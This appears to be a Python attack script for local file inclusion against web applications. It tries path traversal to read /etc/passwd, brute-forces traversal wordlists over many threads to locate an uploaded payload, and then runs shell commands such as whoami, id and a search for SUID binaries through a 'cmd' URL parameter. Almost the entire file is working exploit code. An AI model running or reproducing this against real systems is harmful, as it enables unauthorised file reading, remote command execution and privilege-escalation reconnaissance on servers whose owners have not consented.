#!/usr/bin/env python3

import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

TRAVERSAL_WORDLIST = "wordlists/traversal_small.txt"  # wordlists/traversal_small.txt OR wordlists/traversal_big.txt

def show_passwd(target_url, COOKIE):
    print("Attempting to show /etc/passwd...")

    passwd_dir = ["../../../../../../etc/passwd", "/etc/passwd"]

    for passwd in passwd_dir:
        test_url = target_url + passwd
        print(f"[*] Trying LFI URL: {test_url}")
        response = requests.get(test_url, cookies=COOKIE)

        if "root:" in response.text:
            print(response.text)
            return True
        else:
            print("FAILED")
    return False


def brute_force_lfi(
    lfi_url_base,
    payload_filenames,
    success_indicator,
    failure_indicator,
    dir_wordlist,
    session,
    COOKIE,
):

    print(f"Success indicator: {success_indicator}")
    print(f"Failure indicator: {failure_indicator}")

    with open(dir_wordlist, "r") as f:
        payload_relatives = [
            line.strip() for line in f if not line.strip().startswith("#")
        ]

    with open(TRAVERSAL_WORDLIST, "r") as f:
        traversals = f.read().strip().split("\n")

    successful_links = []

    # Create a function to test a single URL - rename it to avoid conflict
    def test_single_url(url_to_test):
        try:
            response = session.get(url_to_test, cookies=COOKIE, timeout=5)
            
            # Failure indicator check
            if failure_indicator and failure_indicator in response.text:
                return None
                
            # Success indicator check
            if success_indicator and success_indicator in response.text:
                return url_to_test
                
            # If no success indicator, assume success when failure is absent
            if (not success_indicator and failure_indicator and 
                failure_indicator not in response.text):
                return url_to_test
                
            return None
        except Exception as e:
            print(f"[-] Error testing {url_to_test}: {str(e)}")
            return None

    # Create all test URLs
    all_test_urls = []
    for payload_relative in payload_relatives:
        for traversal in traversals:
            for payload_filename in payload_filenames:
                test_url = f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
                all_test_urls.append(test_url)
    
    # Submit all tasks to the executor
    with ThreadPoolExecutor(max_workers=100) as executor:
        # Make sure we're passing the function name correctly
        futures = [executor.submit(test_single_url, url) for url in all_test_urls]
        
        # Process results as they complete
        for future in futures:
            result = future.result()
            if result:
                print(f"[+] Successfully included payload: {result}")
                successful_links.append(result)

    return successful_links


def trigger_payload_via_lfi(url, COOKIE):
    """
    Appends the command parameter to the LFI URL to trigger our uploaded payload.
    """
    commands = [
        "whoami",
        "id",
        "uname -a",
        "grep 'x:1000:' /etc/passwd",
        "ls -lAh /home",
        "find /usr/bin /bin -perm -4000 2>/dev/null",
    ]

    for command in commands:
        encoded_cmd = urllib.parse.quote(command)
        separator = "&" if "?" in url else "?"
        full_url = f"{url}{separator}cmd={encoded_cmd}"
        print(f"[*] Triggering payload via LFI at: {full_url}\n")

        try:
            response = requests.get(full_url, cookies=COOKIE)
            if response.status_code == 200:
                # print("[+] Command results:")
                # print(response.text)
                return response.text
            else:
                print(f"[-] Execution failed (HTTP {response.status_code})")
                return None
        except Exception as e:
            print(f"[-] Trigger error: {str(e)}")
            return None
